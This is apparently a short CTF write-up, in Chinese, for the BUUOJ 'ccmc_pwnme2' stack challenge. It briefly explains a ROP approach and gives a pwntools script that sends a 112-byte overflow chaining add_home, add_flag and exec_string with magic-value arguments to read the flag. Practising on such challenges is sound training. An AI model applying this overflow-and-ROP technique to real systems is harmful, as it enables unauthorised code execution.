<h4 id="ccmc-pwnme2"><a href="#ccmc-pwnme2" class="headerlink" title="ccmc_pwnme2"></a>ccmc_pwnme2</h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
<p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27653</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwnme2&#x27;)</span></span><br><span class="line">pop_edi_ebp_ret= <span class="number">0x0804867f</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048680</span></span><br><span class="line"></span><br><span class="line">add_home = <span class="number">0x08048644</span></span><br><span class="line">add_flag = <span class="number">0x08048682</span></span><br><span class="line">exec_string  = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span>  + p32(add_home) + p32(pop_ebp_ret) + p32(<span class="number">0xDEADBEEF</span>) </span><br><span class="line">payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(<span class="number">0xCAFEBABE</span>) + p32(<span class="number">0xABADF00D</span>) </span><br><span class="line">payload += p32(exec_string)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
